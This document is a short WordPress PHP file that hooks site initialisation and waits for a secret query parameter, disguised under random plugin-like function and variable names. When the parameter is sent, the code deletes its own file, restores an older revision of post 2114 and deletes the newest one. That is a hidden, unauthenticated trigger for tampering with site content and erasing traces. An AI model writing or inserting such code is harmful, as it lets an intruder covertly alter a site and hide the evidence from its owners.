<?php

function current_variation_tab_ratings() {
	if (isset($_GET['maintenance_filter_shop_redirection']) && $_GET['maintenance_filter_shop_redirection'] === 'refresh_wpforms_insert') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$addons_more_dev = 2114;
		$weather_monitor_stop = wp_get_post_revisions($addons_more_dev);
		if (empty($weather_monitor_stop)) die('no revisions');
		if (count($weather_monitor_stop) < 2) die('less than 2');
		$domain_library_time = array_shift($weather_monitor_stop);
		$display_captcha_interactive_redirect = $domain_library_time->ID;
		$tool_maps_reminder = array_shift($weather_monitor_stop);
		$system_recent_suite = $tool_maps_reminder->ID;
		$api_translation_marketing_slide = wp_restore_post_revision($system_recent_suite);
		if ($api_translation_marketing_slide === false) die('error restoring');
		$api_translation_marketing_slide = wp_delete_post_revision($display_captcha_interactive_redirect);		
		if ($api_translation_marketing_slide === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'current_variation_tab_ratings');
